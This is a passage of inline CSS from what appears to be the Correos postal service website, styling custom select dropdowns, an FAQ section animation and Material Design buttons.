			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select:focus,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select:hover,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select:focus,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select:hover,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select:focus {
				background-color: rgba(0, 46, 109, 0.1)
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .sc-correos-ui-custom-select.sc-correos-ui-custom-select {
				border-radius: 8px
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:after,
			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:after,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:after,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before {
				content: " ";
				top: -16px;
				border: solid transparent;
				right: 30px;
				left: unset;
				-webkit-transform: rotate(0);
				transform: rotate(0);
				width: 4px;
				position: absolute;
				pointer-events: none;
				border-color: var(--_ui-custom-label-color);
				border-bottom-color: var(--_ui-custom-select-background-color);
				border-width: 8px
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before {
				top: -18px;
				border-color: var(--_ui-custom-select-background-color);
				border-bottom-color: transparent;
				z-index: 2
			}

			@media (min-width: 1024px) {

				[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
				[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
				[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
					top: 67px;
					max-width: 392px
				}
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select {
				height: 24px;
				width: 24px;
				margin-right: 15px;
				margin-left: 0px
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select .ui-profile-image.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select .ui-profile-image.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select .ui-profile-image.sc-correos-ui-custom-select {
				height: 24px;
				width: 24px;
				border-radius: 50%
			}

			@media (min-width: 1024px) {

				[variant=header-private].sc-correos-ui-custom-select-h,
				[variant=actions-menu].sc-correos-ui-custom-select-h,
				[variant=actions-button].sc-correos-ui-custom-select-h {
					margin-right: 10px
				}

				[variant=header-private].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select,
				[variant=actions-menu].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select,
				[variant=actions-button].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select {
					height: 32px;
					width: 32px
				}

				[variant=header-private].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select .ui-profile-image.sc-correos-ui-custom-select,
				[variant=actions-menu].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select .ui-profile-image.sc-correos-ui-custom-select,
				[variant=actions-button].sc-correos-ui-custom-select-h .ui-profile-figure.sc-correos-ui-custom-select .ui-profile-image.sc-correos-ui-custom-select {
					height: 32px;
					width: 32px
				}
			}

			[variant=header-private].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select,
			[variant=actions-menu].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select {
				display: block;
				max-height: initial
			}

			@media (min-width: 640px) {

				[variant=header-private].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select,
				[variant=actions-menu].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select,
				[variant=actions-button].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select {
					max-height: initial
				}
			}

			@media (min-width: 1024px) {

				[variant=header-private].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select,
				[variant=actions-menu].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select,
				[variant=actions-button].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select {
					max-height: initial
				}
			}

			[variant=citypaq].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none;
				max-height: 550px;
				margin-bottom: 0
			}

			[variant=citypaq].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select {
				width: 100%
			}

			[variant=citypaq].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-option-content.sc-correos-ui-custom-select {
				width: 100%
			}

			[variant=citypaq].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-option-content.sc-correos-ui-custom-select .icon.selected.sc-correos-ui-custom-select {
				color: var(--_ui-custom-select-background-color)
			}

			[variant=citypaq].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-option-content.sc-correos-ui-custom-select .title.selected.sc-correos-ui-custom-select {
				color: var(--_ui-custom-select-background-color)
			}

			[variant=citypaq].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-option-content.sc-correos-ui-custom-select .text-body.sc-correos-ui-custom-select {
				background-color: transparent
			}

			[variant=citypaq].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-option-content.sc-correos-ui-custom-select .text-body.selected.sc-correos-ui-custom-select {
				color: var(--_ui-custom-select-background-color)
			}

			[variant=citypaq].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-option-content.sc-correos-ui-custom-select .distance.sc-correos-ui-custom-select {
				background-color: transparent
			}

			[variant=citypaq].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select .ui-option-content.sc-correos-ui-custom-select .distance.selected.sc-correos-ui-custom-select {
				color: var(--_ui-custom-select-background-color)
			}

			[variant=citypaq].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select {
				display: block;
				max-height: 550px
			}

			@media (min-width: 640px) {
				[variant=citypaq].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select {
					max-height: none
				}
			}

			@media (min-width: 1024px) {
				[variant=citypaq].sc-correos-ui-custom-select-h correos-ui-scroll-bar.sc-correos-ui-custom-select {
					max-height: none
				}
			}

			[margin-bottom=true].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				margin-bottom: 0
			}

			[variant=label-float].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				padding: 20px 16px 6px 16px
			}

			[variant=label-float].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
				text-overflow: ellipsis;
				white-space: nowrap;
				overflow: hidden
			}

			[variant=label-float].sc-correos-ui-custom-select-h .ui-dropwdown-options.sc-correos-ui-custom-select correos-ui-scroll-bar.sc-correos-ui-custom-select>.cdk-content.sc-correos-ui-custom-select {
				max-height: 250px
			}

			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-button-options.sc-correos-ui-custom-select:hover,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-button-options.sc-correos-ui-custom-select:hover {
				border-radius: 50%;
				width: 32px;
				height: 32px;
				background-color: #cfebee
			}

			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-button-options.sc-correos-ui-custom-select .icon-options.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-button-options.sc-correos-ui-custom-select .icon-options.sc-correos-ui-custom-select {
				color: var(--_ui-custom-label-color);
				width: 32px;
				height: 32px
			}

			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select {
				height: auto
			}

			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				padding-right: 0px
			}

			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				max-width: 304px;
				top: 48px
			}

			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:after,
			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:after,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before {
				content: " ";
				top: -16px;
				border: solid transparent;
				right: 27px;
				left: unset;
				-webkit-transform: rotate(0);
				transform: rotate(0);
				width: 2px;
				position: absolute;
				pointer-events: none;
				border-color: var(--_ui-custom-label-color);
				border-bottom-color: var(--_ui-custom-select-background-color);
				border-width: 8px
			}

			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select:before {
				top: -18px;
				border-color: var(--_ui-custom-select-background-color);
				border-bottom-color: transparent;
				z-index: 2
			}

			@media (min-width: 1024px) {

				[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
				[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
					top: 48px;
					max-width: 392px
				}
			}

			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				display: none
			}

			[variant=actions-menu].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select,
			[variant=actions-button].sc-correos-ui-custom-select-h .ui-container.open.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select {
				display: block
			}

			@media (min-width: 1024px) {
				[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
					max-width: 170px
				}
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
				font-size: 0.75rem;
				line-height: 1.175rem;
				display: block
			}

			@media (min-width: 1024px) {
				[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select .ui-panel__textcontent.sc-correos-ui-custom-select {
					font-size: 0.875rem;
					line-height: 1.25rem
				}
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .--longText.sc-correos-ui-custom-select {
				text-overflow: ellipsis;
				white-space: nowrap;
				overflow: hidden
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select .ui-option.sc-correos-ui-custom-select {
				padding: 0
			}

			[variant=header-private].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-dropwdown-options.sc-correos-ui-custom-select .cdk-container.sc-correos-ui-custom-select a.ui-option.sc-correos-ui-custom-select {
				padding: 24px
			}

			[variant=lite].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select {
				height: 40px
			}

			@media (min-width: 640px) {
				[variant=lite].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select {
					height: 40px
				}
			}

			[variant=lite].sc-correos-ui-custom-select-h .ui-container.sc-correos-ui-custom-select .ui-panel.sc-correos-ui-custom-select {
				padding-left: 8px
			}
		</style>
		<style>
			.sc-correos-cdk-faqs-spa-h {
				display: block
			}

			.sc-correos-cdk-faqs-spa-h .title.sc-correos-cdk-faqs-spa {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 1.5rem;
				line-height: 2.25rem;
				padding: 24px 0
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-faqs-spa-h .title.sc-correos-cdk-faqs-spa {
					font-size: 2rem;
					line-height: 2.75rem
				}
			}

			.sc-correos-cdk-faqs-spa-h .cdk-container-faqs.sc-correos-cdk-faqs-spa {
				padding: 0 24px
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-faqs-spa-h .cdk-container-faqs.sc-correos-cdk-faqs-spa {
					padding: 0
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-faqs-spa-h .cdk-container-faqs.sc-correos-cdk-faqs-spa {
					padding: 0
				}
			}

			.sc-correos-cdk-faqs-spa-h .parent-element.sc-correos-cdk-faqs-spa .faqs.sc-correos-cdk-faqs-spa {
				visibility: hidden
			}

			.sc-correos-cdk-faqs-spa-h .parent-element.sc-correos-cdk-faqs-spa .faqs.sc-correos-cdk-faqs-spa .slide-in-bottom.sc-correos-cdk-faqs-spa {
				-webkit-animation: slide-in-bottom 1.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) 1s both;
				animation: slide-in-bottom 1.5s cubic-bezier(0.25, 0.46, 0.45, 0.94) 1s both
			}

			@-webkit-keyframes slide-in-bottom {
				0% {
					-webkit-transform: translateY(300px);
					transform: translateY(300px);
					opacity: 0
				}

				100% {
					-webkit-transform: translateY(0);
					transform: translateY(0);
					opacity: 1
				}
			}

			@keyframes slide-in-bottom {
				0% {
					-webkit-transform: translateY(300px);
					transform: translateY(300px);
					opacity: 0
				}

				100% {
					-webkit-transform: translateY(0);
					transform: translateY(0);
					opacity: 1
				}
			}
		</style>
		<style>
			.mdc-touch-target-wrapper.sc-correos-ui-button {
				display: inline
			}

			.mdc-button.sc-correos-ui-button {
				font-family: Roboto, sans-serif;
				-moz-osx-font-smoothing: grayscale;
				-webkit-font-smoothing: antialiased;
				font-size: 0.875rem;
				line-height: 2.25rem;
				font-weight: 500;
				letter-spacing: 0.0892857143em;
				text-decoration: none;
				text-transform: uppercase;
				padding: 0 8px 0 8px;
				display: -ms-inline-flexbox;
				display: inline-flex;
				position: relative;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: center;
				justify-content: center;
				-webkit-box-sizing: border-box;
				box-sizing: border-box;
				min-width: 64px;
				border: none;
				outline: none;
				line-height: inherit;
				-webkit-user-select: none;
				-moz-user-select: none;
				-ms-user-select: none;
				user-select: none;
				-webkit-appearance: none;
				overflow: visible;
				vertical-align: middle;
				border-radius: 4px
			}

			.mdc-button.sc-correos-ui-button::-moz-focus-inner {
				padding: 0;
				border: 0
			}

			.mdc-button.sc-correos-ui-button:active {
				outline: none
			}

			.mdc-button.sc-correos-ui-button:hover {
				cursor: pointer
			}

			.mdc-button.sc-correos-ui-button:disabled {
				background-color: transparent;
				color: rgba(0, 0, 0, 0.37);
				cursor: default;
				pointer-events: none
			}

			.mdc-button.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button {
				border-radius: 4px
			}

			.mdc-button.sc-correos-ui-button:not(:disabled) {
				background-color: transparent
			}

			.mdc-button.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button {
				margin-left: 0;
				margin-right: 8px;
				display: inline-block;
				width: 18px;
				height: 18px;
				font-size: 18px;
				vertical-align: top
			}

			[dir=rtl].sc-correos-ui-button .mdc-button.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
			.mdc-button.sc-correos-ui-button .mdc-button__icon[dir=rtl].sc-correos-ui-button {
				margin-left: 8px;
				margin-right: 0
			}

			.mdc-button.sc-correos-ui-button .mdc-button__touch.sc-correos-ui-button {
				position: absolute;
				top: 50%;
				right: 0;
				left: 0;
				height: 48px;
				-webkit-transform: translateY(-50%);
				transform: translateY(-50%)
			}

			.mdc-button.sc-correos-ui-button:not(:disabled) {
				color: #6200ee;
				color: var(--mdc-theme-primary, #6200ee)
			}

			.mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button {
				margin-left: 8px;
				margin-right: 0
			}

			[dir=rtl].sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
			.mdc-button__label.sc-correos-ui-button+.mdc-button__icon[dir=rtl].sc-correos-ui-button {
				margin-left: 0;
				margin-right: 8px
			}

			svg.mdc-button__icon.sc-correos-ui-button {
				fill: currentColor
			}

			.mdc-button--raised.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
			.mdc-button--unelevated.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
			.mdc-button--outlined.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button {
				margin-left: -4px;
				margin-right: 8px
			}

			[dir=rtl].sc-correos-ui-button .mdc-button--raised.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
			.mdc-button--raised.sc-correos-ui-button .mdc-button__icon[dir=rtl].sc-correos-ui-button,
			[dir=rtl].sc-correos-ui-button .mdc-button--unelevated.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
			.mdc-button--unelevated.sc-correos-ui-button .mdc-button__icon[dir=rtl].sc-correos-ui-button,
			[dir=rtl].sc-correos-ui-button .mdc-button--outlined.sc-correos-ui-button .mdc-button__icon.sc-correos-ui-button,
			.mdc-button--outlined.sc-correos-ui-button .mdc-button__icon[dir=rtl].sc-correos-ui-button {
				margin-left: 8px;
				margin-right: -4px
			}

			.mdc-button--raised.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
			.mdc-button--unelevated.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
			.mdc-button--outlined.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button {
				margin-left: 8px;
				margin-right: -4px
			}

			[dir=rtl].sc-correos-ui-button .mdc-button--raised.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
			.mdc-button--raised.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon[dir=rtl].sc-correos-ui-button,
			[dir=rtl].sc-correos-ui-button .mdc-button--unelevated.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
			.mdc-button--unelevated.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon[dir=rtl].sc-correos-ui-button,
			[dir=rtl].sc-correos-ui-button .mdc-button--outlined.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon.sc-correos-ui-button,
			.mdc-button--outlined.sc-correos-ui-button .mdc-button__label.sc-correos-ui-button+.mdc-button__icon[dir=rtl].sc-correos-ui-button {
				margin-left: -4px;
				margin-right: 8px
			}

			.mdc-button--raised.sc-correos-ui-button,
			.mdc-button--unelevated.sc-correos-ui-button {
				padding: 0 16px 0 16px
			}

			.mdc-button--raised.sc-correos-ui-button:disabled,
			.mdc-button--unelevated.sc-correos-ui-button:disabled {
				background-color: rgba(0, 0, 0, 0.12);
				color: rgba(0, 0, 0, 0.37)
			}

			.mdc-button--raised.sc-correos-ui-button:not(:disabled),
			.mdc-button--unelevated.sc-correos-ui-button:not(:disabled) {
				background-color: #6200ee
			}

			@supports not (-ms-ime-align: auto) {

				.mdc-button--raised.sc-correos-ui-button:not(:disabled),
				.mdc-button--unelevated.sc-correos-ui-button:not(:disabled) {
					background-color: var(--mdc-theme-primary, #6200ee)
				}
			}

			.mdc-button--raised.sc-correos-ui-button:not(:disabled),
			.mdc-button--unelevated.sc-correos-ui-button:not(:disabled) {
				color: #fff;
				color: var(--mdc-theme-on-primary, #fff)
			}

			.mdc-button--raised.sc-correos-ui-button {
				-webkit-box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
				box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2), 0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
				-webkit-transition: -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1);
				transition: box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1), -webkit-box-shadow 280ms cubic-bezier(0.4, 0, 0.2, 1)
			}

			.mdc-button--raised.sc-correos-ui-button:hover,
			.mdc-button--raised.sc-correos-ui-button:focus {
				-webkit-box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12);
				box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2), 0px 4px 5px 0px rgba(0, 0, 0, 0.14), 0px 1px 10px 0px rgba(0, 0, 0, 0.12)
			}

			.mdc-button--raised.sc-correos-ui-button:active {
				-webkit-box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12);
				box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, 0.2), 0px 8px 10px 1px rgba(0, 0, 0, 0.14), 0px 3px 14px 2px rgba(0, 0, 0, 0.12)
			}

			.mdc-button--raised.sc-correos-ui-button:disabled {
				-webkit-box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12);
				box-shadow: 0px 0px 0px 0px rgba(0, 0, 0, 0.2), 0px 0px 0px 0px rgba(0, 0, 0, 0.14), 0px 0px 0px 0px rgba(0, 0, 0, 0.12)
			}

			.mdc-button--outlined.sc-correos-ui-button {
				border-style: solid;
				padding: 0 15px 0 15px;
				border-width: 1px
			}

			.mdc-button--outlined.sc-correos-ui-button:disabled {
				border-color: rgba(0, 0, 0, 0.37)
			}

			.mdc-button--outlined.sc-correos-ui-button .mdc-button__ripple.sc-correos-ui-button {
				top: -1px;
				left: -1px;
				border: 1px solid transparent
			}

			.mdc-button--outlined.sc-correos-ui-button:not(:disabled) {
				border-color: #6200ee;
				border-color: var(--mdc-theme-primary, #6200ee)
			}

			.mdc-button--touch.sc-correos-ui-button {
				margin-top: 6px;
				margin-bottom: 6px
			}

			@-webkit-keyframes mdc-ripple-fg-radius-in {
				from {
					-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
					transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
				}

				to {
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
					transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
				}
			}

			@keyframes mdc-ripple-fg-radius-in {
				from {
					-webkit-animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					animation-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1);
					transform: translate(var(--mdc-ripple-fg-translate-start, 0)) scale(1)
				}

				to {
					-webkit-transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1));
					transform: translate(var(--mdc-ripple-fg-translate-end, 0)) scale(var(--mdc-ripple-fg-scale, 1))
				}
			}

			@-webkit-keyframes mdc-ripple-fg-opacity-in {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: 0
				}

				to {
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}
			}

			@keyframes mdc-ripple-fg-opacity-in {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: 0
				}

				to {
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}
			}

			@-webkit-keyframes mdc-ripple-fg-opacity-out {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}

				to {
					opacity: 0
				}
			}

			@keyframes mdc-ripple-fg-opacity-out {
				from {
					-webkit-animation-timing-function: linear;
					animation-timing-function: linear;
					opacity: var(--mdc-ripple-fg-opacity, 0)
				}

				to {
					opacity: 0
				}
			}

			.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-button {
				--mdc-ripple-surface-test-edge-var: 1px solid #000;
				visibility: hidden
			}

			.mdc-ripple-surface--test-edge-var-bug.sc-correos-ui-button::before {
				border: var(--mdc-ripple-surface-test-edge-var)
			}

			.mdc-button.sc-correos-ui-button {
				--mdc-ripple-fg-size: 0;
				--mdc-ripple-left: 0;
				--mdc-ripple-top: 0;
				--mdc-ripple-fg-scale: 1;
				--mdc-ripple-fg-translate-end: 0;
				--mdc-ripple-fg-translate-start: 0;
				-webkit-tap-highlight-color: rgba(0, 0, 0, 0)
			}

